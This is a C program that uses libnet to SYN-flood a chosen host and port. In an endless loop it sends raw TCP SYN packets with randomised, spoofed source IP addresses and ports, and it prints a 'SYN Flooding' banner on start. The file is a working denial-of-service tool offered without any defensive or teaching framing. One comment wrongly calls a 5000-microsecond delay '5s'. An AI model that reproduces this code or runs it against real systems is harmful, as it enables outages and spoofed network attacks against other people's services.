#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <libnet.h>

#define FLOOD_DELAY 5000 // Delay between packet injection by 5s

char *print_ip(u_long ip_addr){
  struct in_addr addr;
  addr.s_addr = ip_addr;
  return inet_ntoa(addr);
}

int main(int argc, char *argv[]){
  libnet_t *l; // Libnet context
  char errbuf[LIBNET_ERRBUF_SIZE];
  u_long dest_ip;
  u_short dest_port;
  libnet_ptag_t ip_tag, tcp_tag;

  if (argc < 3){
    printf("Usage: \n\t%s <target host> <target port>\n", argv[0]);
    exit(1);
  }

  l = libnet_init(LIBNET_RAW4, NULL, errbuf);
  if (l == NULL){
    fprintf(stderr, "libnet_init() failed: %s\n", errbuf);
    exit(1);
  }
  dest_ip = libnet_name2addr4(l, argv[1], LIBNET_RESOLVE);
  if (dest_ip == -1){
    fprintf(stderr, "Invalid IP address: %s\n", argv[1]);
    exit(1);
  }
  dest_port = (u_short)atoi(argv[2]);


  printf("SYN Flooding port %d of %s..\n", dest_port, print_ip(dest_ip));

  libnet_seed_prand(l);

  while (1){
    // Build TCP header
    tcp_tag = libnet_build_tcp(
			       libnet_get_prand(LIBNET_PR16), // Source port
			       dest_port, // Destination port
			       libnet_get_prand(LIBNET_PR32), // Sequence number
			       libnet_get_prand(LIBNET_PR32), // Acknowledgement number
			       TH_SYN, // Control flags (SYN)
			       libnet_get_prand(LIBNET_PR16), // Window size
			       0, // Urgent pointer
			       0, // TCP payload length
			       LIBNET_TCP_H, // TCP header length
			       NULL, // Payload
			       0, // Payload length
			       l, // Libnet context
			       0);  // Protocol tag

    // Build IPv4 header
    ip_tag = libnet_build_ipv4(
			       LIBNET_IPV4_H + LIBNET_TCP_H, // Total packet length
			       0, // TOS
			       libnet_get_prand(LIBNET_PR16), // IP ID
			       0, // Fragmentation flags
			       libnet_get_prand(LIBNET_PR8), // TTL
			       IPPROTO_TCP, // Protocol
			       0, // Checksum (auto)
			       libnet_get_prand(LIBNET_PR32), // Source IP
			       dest_ip, // Destination IP
			       NULL, // Payload
			       0, // Payload length
			       l, // Libnet context
			       0); // Protocol tag

    if (libnet_write(l) == -1){
      fprintf(stderr, "Error writing packet: %s\n", libnet_geterror(l));
    }

    usleep(FLOOD_DELAY);  // Wait for FLOOD_DELAY microseconds

    libnet_clear_packet(l);  // Reset the packet
  }

  libnet_destroy(l); // Free resource
}
